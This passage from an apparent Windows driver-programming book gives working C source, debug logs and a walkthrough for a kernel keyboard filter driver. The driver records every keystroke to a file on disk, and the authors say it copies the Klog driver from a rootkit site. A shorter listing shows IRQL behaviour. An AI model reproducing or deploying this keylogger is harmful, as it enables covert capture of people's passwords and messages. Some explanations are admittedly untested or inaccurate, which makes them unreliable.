        pListEntry = ExInterlockedRemoveHeadList( & pzzz -> List, & pzzz -> spin);
        z = (struct KEY_DATA * ) pListEntry;
        DbgPrint("Scan Code=%d", z -> KeyData);
        if (pzzz -> bThreadTerminate == 1) {
            DbgPrint("Terminating thread");
            PsTerminateSystemThread(STATUS_SUCCESS);
        }
        kData = CONTAINING_RECORD(pListEntry, struct KEY_DATA, ListEntry);
        key = KeyMap[kData -> KeyData];
        KeInitializeEvent( & event, NotificationEvent, FALSE);
        irp = IoBuildDeviceIoControlRequest(IOCTL_KEYBOARD_QUERY_INDICATORS, pzzz -> pakd, NULL, 0, & indParams, sizeof(KEYBOARD_ATTRIBUTES), TRUE, & event, & ioStatus);
        status = IoCallDriver(pzzz -> pakd, irp);
        if (status == STATUS_PENDING) {
            DbgPrint("In thread if statement");
            (VOID) KeWaitForSingleObject( & event, Suspended, KernelMode, FALSE, NULL);
        }
        status = irp -> IoStatus.Status;
        if (status == STATUS_SUCCESS) {
            DbgPrint("kData=%x pListEntry =%x status=%d LedFlags=%x", kData, pListEntry, status, indParams.LedFlags);
            caps = (indParams.LedFlags & KEYBOARD_CAPS_LOCK_ON) == 4;
            num = (indParams.LedFlags & KEYBOARD_NUM_LOCK_ON) == 2;
            scroll = (indParams.LedFlags & KEYBOARD_SCROLL_LOCK_ON) == 1;
            DbgPrint("caps=%d num=%d scroll=%d", caps, num, scroll);
        }
        switch (key) {
        case LSHIFT:
            if (kData -> KeyFlags == KEY_MAKE)
                pzzz -> kState.kSHIFT = 1;
            else
                pzzz -> kState.kSHIFT = 0;
            break;
        case RSHIFT:
            if (kData -> KeyFlags == KEY_MAKE)
                pzzz -> kState.kSHIFT = 1;
            else
                pzzz -> kState.kSHIFT = 0;
            break;
        case CTRL:
            if (kData -> KeyFlags == KEY_MAKE)
                pzzz -> kState.kCTRL = 1;
            else
                pzzz -> kState.kCTRL = 0;
            break;
        case ALT:
            if (kData -> KeyFlags == KEY_MAKE)
                pzzz -> kState.kALT = 1;
            else
                pzzz -> kState.kALT = 0;
            break;
        case SPACE:
            if ((pzzz -> kState.kALT != 1) && (kData -> KeyFlags == KEY_BREAK))
                keys[0] = 0x20;
            break;
        case ENTER:
            if ((pzzz -> kState.kALT != 1) && (kData -> KeyFlags == KEY_BREAK)) {
                keys[0] = 0x0D;
                keys[1] = 0x0A;
            }
            break;
        default:
            if ((pzzz -> kState.kALT != 1) && (pzzz -> kState.kCTRL != 1) && (kData -> KeyFlags == KEY_MAKE)) {
                if ((key >= 0x21) && (key <= 0x7E)) {
                    if (pzzz -> kState.kSHIFT == 1)
                        keys[0] = ExtendedKeyMap[kData -> KeyData];
                    else
                        keys[0] = key;
                }
            }
            break;
        }
        if (keys[0] != 0) {
            if (pzzz -> hLogFile != NULL) {
                IO_STATUS_BLOCK io_status;
                ZwWriteFile(pzzz -> hLogFile, NULL, NULL, NULL, & io_status, & keys, strlen(keys), NULL, NULL);
                DbgPrint("Scan code '%s' successfully written to file.\n", keys);
            }
        }
    }
    return;
}
NTSTATUS DriverEntry(PDRIVER_OBJECT p, PUNICODE_STRING r) {
    int i;
    Pzzz pzzz;
    PDEVICE_OBJECT pgenericdevice;
    CCHAR ntNameBuffer[64] = "\\Device\\KeyboardClass0";
    STRING ntNameString;
    UNICODE_STRING uKeyboardDeviceName;
    HANDLE hThread;
    IO_STATUS_BLOCK file_status;
    OBJECT_ATTRIBUTES obj_attrib;
    CCHAR ntNameFile[64] = "\\DosDevices\\c:\\driverm\\z.txt";
    UNICODE_STRING uFileName;
    DbgPrint("DriverEntry Start");
    for (i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
        p -> MajorFunction[i] = DispatchPassDown;
    p -> MajorFunction[IRP_MJ_READ] = abcRead;
    IoCreateDevice(p, sizeof(zzz), 0, FILE_DEVICE_KEYBOARD, 0, 1, & pgenericdevice);
    pgenericdevice -> Flags = pgenericdevice -> Flags | (DO_BUFFERED_IO | DO_POWER_PAGABLE);
    pgenericdevice -> Flags = pgenericdevice -> Flags & ~DO_DEVICE_INITIALIZING;
    RtlZeroMemory(pgenericdevice -> DeviceExtension, sizeof(zzz));
    pzzz = (Pzzz) pgenericdevice -> DeviceExtension;
    RtlInitAnsiString( & ntNameString, ntNameBuffer);
    RtlAnsiStringToUnicodeString( & uKeyboardDeviceName, & ntNameString, TRUE);
    IoAttachDevice(pgenericdevice, & uKeyboardDeviceName, & pzzz -> pakd);
    RtlFreeUnicodeString( & uKeyboardDeviceName);
    pzzz -> bThreadTerminate = 0;
    PsCreateSystemThread( & hThread, 0, 0, 0, 0, abc, pzzz);
    ObReferenceObjectByHandle(hThread, THREAD_ALL_ACCESS, 0, KernelMode, (PVOID * ) & pzzz -> pThreadObj, 0);
    ZwClose(hThread);
    InitializeListHead( & pzzz -> List);
    KeInitializeSpinLock( & pzzz -> spin);
    KeInitializeSemaphore( & pzzz -> sem, 0, MAXLONG);
    RtlInitAnsiString( & ntNameString, ntNameFile);
    RtlAnsiStringToUnicodeString( & uFileName, & ntNameString, TRUE);
    InitializeObjectAttributes( & obj_attrib, & uFileName, OBJ_CASE_INSENSITIVE, NULL, NULL);
    ZwCreateFile( & pzzz -> hLogFile, GENERIC_WRITE, & obj_attrib, & file_status, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    RtlFreeUnicodeString( & uFileName);
    p -> DriverUnload = Unload;
    DbgPrint("DriverEntry End");
    return STATUS_SUCCESS;
}
```
```
DriverEntry Start
DispatchPassDown
DriverEntry End
Before Wait for semaphore in thread
abcRead numPendingIrps=0
abcReadOver numKeys=1 Flags=0 Scancode=21
abcReadOver After Semaphore Release numPendingIrps=1
abcRead numPendingIrps=0
After Wait for semaphore in thread
Scan Code=21
kData=81a4d768 pListEntry =81a4d768 status=0 LedFlags=2
caps=0 num=1 scroll=0
Scan code 'y' successfully written to file.
Before Wait for semaphore in thread
abcReadOver numKeys=1 Flags=1 Scancode=21
abcReadOver After Semaphore Release numPendingIrps=1
abcRead numPendingIrps=0
After Wait for semaphore in thread
Scan Code=21
kData=81b34a48 pListEntry =81b34a48 status=0 LedFlags=2
caps=0 num=1 scroll=0
Before Wait for semaphore in thread
abcReadOver numKeys=1 Flags=0 Scancode=57
abcReadOver After Semaphore Release numPendingIrps=1
abcRead numPendingIrps=0
After Wait for semaphore in thread
Scan Code=57
kData=81ad4448 pListEntry =81ad4448 status=0 LedFlags=2
caps=0 num=1 scroll=0
Before Wait for semaphore in thread
abcReadOver numKeys=1 Flags=1 Scancode=57
abcReadOver After Semaphore Release numPendingIrps=1
abcRead numPendingIrps=0
After Wait for semaphore in thread
Scan Code=57
kData=81a68208 pListEntry =81a68208 status=0 LedFlags=2
caps=0 num=1 scroll=0
Scan code ' ' successfully written to file.
Before Wait for semaphore in thread
abcReadOver numKeys=1 Flags=0 Scancode=12
abcReadOver After Semaphore Release numPendingIrps=1
abcRead numPendingIrps=0
After Wait for semaphore in thread
Scan Code=12
kData=81a67d68 pListEntry =81a67d68 status=0 LedFlags=2
caps=0 num=1 scroll=0
Scan code '-' successfully written to file.
Before Wait for semaphore in thread
abcReadOver numKeys=1 Flags=1 Scancode=12
abcReadOver After Semaphore Release numPendingIrps=1
abcRead numPendingIrps=0
After Wait for semaphore in thread
Scan Code=12
kData=81a8f2e8 pListEntry =81a8f2e8 status=0 LedFlags=2
caps=0 num=1 scroll=0
Before Wait for semaphore in thread
abcReadOver numKeys=1 Flags=0 Scancode=22
abcReadOver After Semaphore Release numPendingIrps=1
abcRead numPendingIrps=0
After Wait for semaphore in thread
Scan Code=22
kData=81652828 pListEntry =81652828 status=0 LedFlags=2
caps=0 num=1 scroll=0
Scan code 'u' successfully written to file.
Before Wait for semaphore in thread
abcReadOver numKeys=1 Flags=1 Scancode=22
abcReadOver After Semaphore Release numPendingIrps=1
abcRead numPendingIrps=0
After Wait for semaphore in thread
Scan Code=22
kData=81a9f3e8 pListEntry =81a9f3e8 status=0 LedFlags=2
caps=0 num=1 scroll=0
Before Wait for semaphore in thread
abcReadOver numKeys=1 Flags=0 Scancode=28
abcReadOver After Semaphore Release numPendingIrps=1
abcRead numPendingIrps=0
After Wait for semaphore in thread
Scan Code=28
kData=81a397c8 pListEntry =81a397c8 status=0 LedFlags=2
caps=0 num=1 scroll=0
Before Wait for semaphore in thread
Unload numPendingIrps=1
abcReadOver numKeys=1 Flags=1 Scancode=28
abcReadOver After Semaphore Release numPendingIrps=1
Unload Before Wait
After Wait for semaphore in thread
Scan Code=28
Terminating thread
Unload After Wait
Y –u
```
This program is one of the longest in the book, but  we have tried to be nice guys and follow all the rules of the book. We will not use the word inspired by but this program is the same as filter driver Klog found on the rootkit site. We have minor changes if any.

Lets explain the program starting from DriverEntry. What parts we have explained before we will gloss over. The MajorFunction array which contains an array of pointer to functions has an interminable size.

We have a macro `IRP_MJ_MAXIMUM_FUNCTION` that tells us how large this array is or how many functions we should hook. The standard practice is that we have one generic function that gets called for all the functions in the array.

Thus we use a for loop and set each member of the MajorFunction array to call a function `DispatchPassDown`. In this function we really do not do much. We first set the stack for the next driver below us using `IoSkipCurrentIrpStackLocation` and then call the next r using `IoCallDriver` and passing our keyboard handle.

The function we are specifically interested in like read we trap ourselves and call the function abcRead. In IoCreateDevice we ask it to allocate memory for a structure of type zzz.

This is a pretty big structure and in it we store all the variables that we would like to passed to all our functions like the file handle. As we start using the variables we will start explaining them. Once again the system allocated that many bytes of memory for us in the member `DeviceExtension` of the `DEVICE_OBJECT` created. The name of the variable is pgenericdevice as before.

Once again we need to make sure that our `DEVICE_OBJECT` just created has the same flags as the actual keyboard driver that we want to filter. We set here flags in this example, but in the one we did with you we set only one.

What we do is try and give you only those flags without which the driver will simply not work. Thus we have added the flag DO_POWER_PAGABLE and removed the flag DO_DEVICE_INITIALIZING. The program device tree tells us which flags the keyboard driver has on or off.

It is a good idea to zero out the memory allocated to us in the DeviceExtension member and we set the pzzz variable to this value. The reason we do it is that pzzz is a pointer to a structure zzz and thus we do not have to cast unnecessarily .

We have to now attach our keyboard to the main keyboard driver. Instead of using a unicode string, most people prefer first initializing a Ansi string and then using a function to convert this ansi string to unicode. Klog uses this method, so do we in this example.

We then use the function IoAttachDevice to attach ourselves to the keyboard and our given another DEVICE_OBJECT pointer that we use instead of the earlier one. We call this pointer pakd as the variable names we getting to large for our book.

This pointer is so important that we will store it in our zzz structure. It is our handle to the keyboard and will use it everywhere instead of our earlier generic handle. Like good guys we free the Unicode string and not the Ansi string.

We set a member bThreadTerminate of the zzz structure to 0 even though it already has such a value. What this member does will be done at the very end. We then create a system thread which calls the function abc passing the addresses of the same structure zzz.

Thus our thread and all functions share these variables.  We however do not want the handle of the thread and thus use the function ObReferenceObjectByHandle which converts this thread handle to a ETHREAD structure which we store in the pThreadObj member of the zzz structure.

We will use this member to wait until the thread finishes. Thus the function abc will execute along with the rest of our driver code in parallel. We the close the thread handle using ZwClose and not thread close as we have no use for the thread handle.

Our zzz structure has a member List of type LIST_ENTRY that will store the head of a doubly linked list and we use the function InitializeListHead to get Blink and Flink to point to itself. We will store all our keys pressed in a doubly linked list.

We next use a function KeInitializeSpinLock that initializes a spin lock for us. This is special purpose lock that does not spin like a top but we will use when we add items to our linked list. Once again we store it in our zzz structure that is passed around to everyone like a football.

We next initialize the semaphore sem of the zzz structure to 0. Once again we use a semaphore in the Wait function so that something can wait until something else happens. We now create a file z.txt in the driverm directory using the ZwCreateFile function using the circuitous route of first creating a ansi string, then uniocde string and then an object.

We however pass some hash defines to our function that we did not do. The fourth parameter is a pointer to a IO_STATUS_BLOCK structure. This comes back and tells us the final completion status like did the file get created, does it exist etc. We do not check the value ourselves and leave it to you as an exercise. A very simply structure, one union and one member called information.

Finally we call the function UnLoad when we unload a driver. At this point in time the thread executes the abc function. Lets look at what happens there. It is this function that writes the keys to the file on disk.

The first thing we do is cast the parameter passed to us as a zzz pointer because that’s what it really is. We also access the keyboard device object pakd as this is the object that represents the keyboard driver. We now enter a infinite while loop, a while(1). The first function is a WaitForSingleObject that waits on the semaphore sem whose value we set to 0.

Thus until someone sets the semaphore sem to 1, the thread waits or sleeps here. All that we would like you to do is simply run y –I and press enter. The thread will be waiting at the Wait and the abcRead function gets called. We have not pressed a key yet.

All that happens in abcRead is that we create the stack for the next driver, we specify which function to be called when the IRP come up the stack. Here we have set the last two parameters to 1 so that in all cases the Read completion function gets called. Thus our driver will pass the IRP to the next below driver and so on until the actual keyboard driver is waiting for a key press.

When we actually press a key, all the Read completion functions of all drivers waiting in queue will be called. We also increase the variable numPendingIrps by 1 so that we do not unload our driver if the key stroke has not gone up the stack. We are yet waiting in the thread as we have not yet increased the semaphore. We now press a key, and as the key moves up the stack our completion function abcReadOver now gets called.

We once again extract our zzz pointer from the DEVICE_OBJECT parameter passed. We as a check first look at the value of the status member, normally it always success. Being paranoid while writing drivers is a good thing. The SystemBuffer member as before is a pointer to a structure KEYBOARD_INPUT_DATA.

We now assume that there could be an array of such structures  and not a single one as we thought. The Information member gives us the size of memory available for us and dividing this by the size of the structure tells is how many structures are there. Even if we keep the key pressed, numkeys is always one. We get one key at a time.

We first allocate memory for a structure KEY_DATA that we use to store the scan code and Flags. This structure starts with a LIST_ENTRY structure so that we can create a doubly linked list. We set the KeyData member to the scan code and KeyFlags member to the Flags variable.

We then call the function ExInterlockedInsertTailList. This function is just like the InsertTailList function but with extra parameter added, the spin lock. Lets assume that we ran our driver on a mult-processor machine. It is here that we need to use spin locks so that the list is synchronized safely on multi-processor machine.

We cannot confirm this as we do not have a multi-processor machine. Klog uses spin locks, we had never ever used a spin lock, so we got an opportunity to use one, we grabbed it with both hands. Interlocked operations cannot cause a page fault. Spin locks are used to have atomic operations on a SMP machine.

The first parameter is our list head, the second the KEY_DATA pointer and the extra parameter is the spin lock. We could either pass the KEY_DATA pointer as kData or as we have &kData->ListEntry. The second form that we use does not give us a casting error. Both are the same as the structure ListEntry is the first member.

Now that we have added our key to the list we increase the semaphore sem by 1 so that it moves out of the Wait function in the thread. But before going over to the thread we set the Irp as pending so that others can get a crack at it. We reduce variable numPendingIrps by 1 as we have handled the keystroke and we return the status value to however called us.

Now back to the thread. The first thing that we do is use the function ExInterlockedRemoveHeadList to remove the first entry from the head even though we added the entry using the Tail function. We store the returned pointer in a LIST_ENTRY structure. The variable bThreadTerminate is yet 0 and when we make it 1 we will explain what it does.

There are many ways to skin a cat. We simply cast the LIST_ENTRY pointer to a KEY_DATA pointer and print out the value of the scan code stored in the KeyData member as z->KeyData. Another way is by using a macro CONTAINING_RECORD.

This is a complex way of extracting a certain member. It breaks up to

kData = CONTAINING_RECORD(pListEntry,struct KEY_DATA,ListEntry);
kData = ((struct KEY_DATA *)( (PCHAR)(pListEntry) - (ULONG_PTR)(&((struct KEY_DATA *)0)->ListEntry)));

We specify the actual pointer pListEntry returned by the Head function. The second parameter is what is the type of return pointer we need. The third is the first member that we want access to ListEntry. All that the macro does is subtract the original pointer from the first member to give us the same value. Thus both kData and pListEntry have the same value if you print them out.

Actually the Head and Tail functions give you a LIST_ENTRY structure but they actually are in our case a KEY_DATA entity. We have a global array KeyMap in file aa.h that simply extracts the character in key depending upon the scan code.

One more synchronization  object is the event and we use the function KeInitializeEvent to create one. The first parameter is the event handle and the second the type of event either notification or synchronization.

The third is the state, false means non signaled. The event is the simplest of all synchronization objects as unlike a semaphore it can have only two states on or off, signaled or nonsignalled. The function IoBuildDeviceIoControlRequest lets us actually send out an IRP.

The first parameter is the Io control code. There is a big list of them and we choose IOCTL_KEYBOARD_QUERY_INDICATORS which lets us ask the keyboard driver what is the status of the query keys. There are a zillion such IO control codes that we can use.

The second parameter is the DEVICE_OBJECT that we send this control code to . Our lower level drivers handle is in the pakd member of the zzz structure. Normally a driver would require some parameters that will be passed in a buffer. We would pass parameters to our driver from user space and these would be available to the driver in the SystemBuffer member.

As we do not require to pass any parameters  we send null. The parameter following is the length of the buffer, 0 in our case. The next two parameters are the output buffer which the driver will fill up. In our case we create a structure indParams of type KEYBOARD_ATTRIBUTES. Whenever the keyboard driver receives such a IOCTL request it expects the address of such a buffer.

Now in the MajorFunction array we have two values IRP_MJ_INTERNAL_DEVICE_CONTROL or IRP_MJ_DEVICE_CONTROL. If we specify true the function associated with the first #define is called. The second last parameter is the address of an event which will be set to true or the signaled state when the driver completes.

The last parameter is a IO_STATUS_BLOCK structure that will be filled up the driver to tell us what happened. This function actually creates a IRP structure that we use in the call to the IoCallDriver function. We pass the pakd handle and this IRP we just created.

The driver may execute our task immediately or it may return STATUS_PENDING. In our case it always returns 0, meaning that the job got done. If it returns STATUS_PENDING, then we have to use the Wait function with the event handle.

When the keyboard driver completes, it will set the event to true and we will move out of the wait. We however have not been able to test out this code. Now that our keyboard driver has been called, it comes back and gives us the status of the caps lock, scroll lock and num lock keys.

The member LedFlags is a series of bits that if on tells us which key is pressed. If the first bit is on, then the scroll lock key has been pressed, the second bit is for num lock and the fourth is caps lock. We have macros like KEYBOARD_CAPS_LOCK_ON which have a value of 4.

Thus we bitwise and LedFlags with three macros and further check if their values are 1, 2 or 4. Thus the above three variables if 1 tell us that the corresponding key was on or not. Now that we have the actual ascii value in the key variable we check if it is one of the special keys.

We first check the key variable for left shift or  right shift value which is scan code 2a and 36  which become in our case 3 and 4.  If true, then we set the SHIFT member of our state structure to 1 if we have pressed the key or key down. The macro KEY_MAKE or 0 is when we press a key, KEY_BREAK or 1 is when we release the key.

When we release the key we change the SHIFT member to 0. Thus when we press any shift key, the SHIFT member of the kstate structure is 1, otherwise 0. When we press the CTRL or ALT keys we store this state in the kCTRL or kAlt member. The space key which is given a value of 1 is handled differently.

Even though like all keys it has a make and a break, we consider the make and not the break. We set the first member of the keys array  to its ASCII value 32 only if we have not pressed the Alt key at the same time. When we press the enter key, key has a value of 2 and if the alt key is not pressed, we put two values in the keys array 0x0d and 0x0a.

Thus all that we are doing here is setting the value into the keys array. Now comes the bulk of the work in the default. We first make sure that the Ctrl or Alt key is not pressed by checking the member in the kstate structure. Then we make sure that it is a key make and not break as otherwise when we repeat a key, it will only display once as key make is called a number of times , break only once when we release the key.  

Then we have another if statement that checks that it is a printable key ranging from 0x21 to 7e. the space we have taken care of earlier. Now comes one last check. If the Shift key is on, then we have to display a capital instead of small. Thus we use the extended array ExtendedKeyMap to pick up the value and place it into the keys array first member.

If not we use the key variable directly to set the keys array. What we have to consider is if caps lock is on and then the user presses a shift, the key must be small. We leave all this to you as we are not in the right frame to write such code. Then we check that the keys[0] has  a valid value that is not 0 and the file handle is not null.

We then write out this value to disk. The array keys is set to 0 at the beginning of the loop. We are either filling up the first or second member, the third is always 0. Thus in the ZwWriteFile function we specify the address of this keys array and use strlen to give us the length 1 or 2. At some point in time we will unload our driver.

At this time the thread is waiting at the Wait function. In the unload function we first detach our device passing the pakd handle. Then we set the member bThreadTerminate to 1. As before we wait in a loop for the key release to move up. We then set the semaphore sem to 1.

This moves the thread into wake state and the first thing it does is checks the value of the `bThreadTerminate` member. As it is one, it calls a function PsTerminateSystemThread which terminates itself. A system thread should terminate itself as per the docs by calling the above function.

Now that the thread is dead the unload function that was waiting for the thread to die can now clean up the rest. It closes the file and deletes the device.

Another way of understanding the above is to follow the steps we specify to the t. First create a sub-directory C:\driverm1 and copy  a.bat from C:\driverm. The last line of `a.bat` is cd\driverm change that to C:\driverm1. Then copy b.bat and change the –out:vijay.sys to –out:vijay1.sys. This changes the output file name to `vijay1.sys`. Finally copy `z.bat` but make no changes. We then copy `aa.h` and `y.c`. In `y.c` we make three changes as.

```c
#define DRV_NAME "vijayd1"
#define DRV_FILENAME "vijay1.sys"
#define DIRECTORY " C:\\driverm1"
```
The name of our service is `vijayd1`, the name of our sys file is vijay1.sys and the directory is `C:\\driverm1`. We then run `z.bat` first to recompile the `y.c`. In `r.c` we remove all the `DbgPrint` statements and then add four of them in their respective functions.
```c
DbgPrint("UnLoad1");
DbgPrint("abcReadOver1 pIrp=%x",pIrp);
DbgPrint("DriverEntry1 End pgenericdevice=%x pakd=%x",pgenericdevice,pzzz->pakd);
DbgPrint("abcRead2 pIrp=%x currentIrpStack=%x nextIrpStack=%x",pIrp,currentIrpStack,nextIrpStack);
```
We are simply displaying the values of the Irp passed and the two device object pointers. We repeat the same process by creating a directory driver2 and replacing all the ones to 2.

We run y –I in all three dos boxes and then press the a key and finally unload the three drivers. We then run the device tree and find the driver `Kbdclass` and then the device `KeyboardClass0`. Its  device object starts at `0x81f63030`, its driver object at `0x81f64710`.
 ```
DriverEntry End pgenericdevice=816f0710 pakd=81f63030
DriverEntry1 End pgenericdevice=81e81890 pakd=816f0710
DriverEntry2 End pgenericdevice=81be8290 pakd=81e81890
```
The `IoCreateDevice` creates a device which is unique but the pointer given to us by `IoAttachDevice` `pakd` `81f63030` is the device object pointer the main keyboard device. This is true for the first driver vijay.sys. The second driver we create vijay1.sys has pakd of `816f0710` which is the device object address of the first driver `vijay.sys`.

The third driver `vijay2.sys` has a `pakd` of `81e81890` which is the address of the device `vijay1.sys`. Thus pakd points to the previous device object in the chain. The first pakd points to the keyboard driver, the second pakd to `vijay1.sys` and so on.

Thus function `IoAttachDevice` gives us the address of the previous device object. Thus when we use the function `IoCallDriver` we should give the handle of the driver to call and we give the next drivers handle to call.
```
abcRead2 pIrp=816d3008 currentIrpStack=816d3198 nextIrpStack=816d3174
abcRead1 pIrp=816d3008 currentIrpStack=816d3174 nextIrpStack=816d3150
abcRead pIrp=816d3008 currentIrpStack=816d3150 nextIrpStack=816d312c
abcReadOver pIrp=816d3008
abcReadOver1 pIrp=816d3008
abcReadOver2 pIrp=816d3008
```
The abcRead functions get called in the last placed called first order. Thus abcRead2 gets called first, then abcRead1 and then abcRead. However the abcReadOver gets called in the reverse order. First vijay.sys, then vijay1.sys and finally vijay2.

The Irp is the same for all the drivers in the chain. There is only one for the entire duration of the life of the driver, in our case it begins at 816d3008.  For abcRead2 the higher most driver its stack begins at 816d3198, the driver that it calls is vijay1.sys and its stack begins at 816d3174.

When we look at abcRead1 or vijay1.sys its stack actually begins at 816d3174 and the next stack of vijay.sys begins at 816d3150. This simply confirms what we have been saying all this time, vijay2.sys calls vijay1.sys which calls vijay.sys which calls the original keyboard driver.
### P20
`r.c`
```c
#include <ntddk.h>
#include <ntddkbd.h>
HANDLE hLogFile;
IO_STATUS_BLOCK file_status;
PDEVICE_OBJECT pactualkeyboarddevice, pgenericdevice;
UNICODE_STRING uKeyboardDeviceName;
int numPendingIrps;
void Unload(PDRIVER_OBJECT pDriverObject) {
    DbgPrint("Driver Unload numPendingIrps=%d %d", numPendingIrps, KeGetCurrentIrql());
    IoDetachDevice(pactualkeyboarddevice);
    while (numPendingIrps > 0);
    IoDeleteDevice(pgenericdevice);
    ZwClose(hLogFile);
}
NTSTATUS OnReadCompletion(PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID Context) {
    PKEYBOARD_INPUT_DATA keys = (PKEYBOARD_INPUT_DATA) pIrp -> AssociatedIrp.SystemBuffer;
    DbgPrint("OnReadCompletion %d", KeGetCurrentIrql());
    if (keys -> Flags == 0)
        DbgPrint("ScanCode %d\n", keys[0].MakeCode);
    IoMarkIrpPending(pIrp);
    numPendingIrps--;
    //ZwWriteFile(hLogFile,0,0,0,0,"vijay",3,0,0);
    return pIrp -> IoStatus.Status;
}
NTSTATUS abcRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
    DbgPrint("abcRead %d", KeGetCurrentIrql());
    IoCopyCurrentIrpStackLocationToNext(pIrp);
    IoSetCompletionRoutine(pIrp, OnReadCompletion, 0, 1, 0, 0);
    numPendingIrps++;
    return IoCallDriver(pactualkeyboarddevice, pIrp);
}
NTSTATUS DriverEntry(PDRIVER_OBJECT d, PUNICODE_STRING r) {
    OBJECT_ATTRIBUTES attr;
    CCHAR ntNameFile[64] = "\\DosDevices\\c:\\driverm\\z.txt";
    UNICODE_STRING uFileName;
    STRING ntNameString;
    OBJECT_ATTRIBUTES obj_attrib;
    DbgPrint("Vijay2 %d", KeGetCurrentIrql());
    d -> MajorFunction[IRP_MJ_READ] = abcRead;
    IoCreateDevice(d, 0, 0, FILE_DEVICE_KEYBOARD, 0, 1, & pgenericdevice);
    pgenericdevice -> Flags = pgenericdevice -> Flags | DO_BUFFERED_IO;
    RtlInitUnicodeString( & uKeyboardDeviceName, L "\\Device\\KeyboardClass0");
    IoAttachDevice(pgenericdevice, & uKeyboardDeviceName, & pactualkeyboarddevice);
    RtlInitAnsiString( & ntNameString, ntNameFile);
    RtlAnsiStringToUnicodeString( & uFileName, & ntNameString, TRUE);
    InitializeObjectAttributes( & obj_attrib, & uFileName, OBJ_CASE_INSENSITIVE, NULL, NULL);
    ZwCreateFile( & hLogFile, GENERIC_WRITE, & obj_attrib, & file_status, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    RtlFreeUnicodeString( & uFileName);
    d -> DriverUnload = Unload;
    return 0;
}
```
```
Vijay2 0
abcRead 0
OnReadCompletion 2
Driver Unload numPendingIrps=1 0
```
In the four functions called we have simply displayed the value returned by the function `KeGetCurrentIrql()`. This function returns for us the IRQL that the function is running at. All the functions called run at IRQL 0, the `OnReadCompletion` runs at IRQL 2. What we would like you to do is place the `ZwWriteFile` function in the OnReadCompletion and the machine gives us the blue screen of death.

If we had code that will call a timer, that code would run at IRQL 2 which is defined as a macro DISPATCH_LEVEL. A IRQL of zero is either `PASSIVE_LEVEL` or `LOW_LEVEL`. The highest level is 31 or `HIGH_LEVEL`. Looking at the help of the function ZwWriteFile it says very clearly at the last line that the called of this function must be running at IRQL passive level or 0.

OnReadCompletion is running at IRQL of 2 and hence we get a BsoD. Most of the Zw functions must be  called from functions running at an IRQ of 0. The function `PsGetCurrentProcess` also must be called from a IRQ of 0.

At any point in time when you see a Bsod, it could be because we are running at an IRQ that is not compatible with the IRQ the function we are calling is compatible with.
